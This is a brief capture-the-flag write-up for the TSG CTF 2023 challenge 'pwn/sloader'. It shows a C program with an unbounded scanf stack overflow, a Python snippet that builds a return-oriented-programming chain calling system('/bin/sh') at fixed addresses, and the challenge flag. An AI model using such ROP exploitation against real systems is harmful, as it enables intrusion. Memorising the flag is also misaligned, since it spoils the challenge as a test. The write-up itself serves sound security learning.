# TSG CTF 2023 - pwn/sloader

## Solution

This challenge has an obvious stack buffer overflow bug:

```c
#include <stdio.h>

int main(void) {
    char buf[16];
    scanf("%s", buf);
    return 0;
}
```

The binary is PIE enabled, but `sloader` seems to be loaded to a fixed address, so we can easily do ROP.

## Exploit

```python
sc.sendline(b"*" * 16 + b"_" * (8 * 2) + u64(
    0,          # (rbp)
    0x10262171, # pop rdi; ret;
    0x10270563, # "/bin/sh"
    0x1012c98c, # ret;
    0x1012c960  # system
))
```

## Flag

```
TSGCTF{sload_your_way_to_glory}
```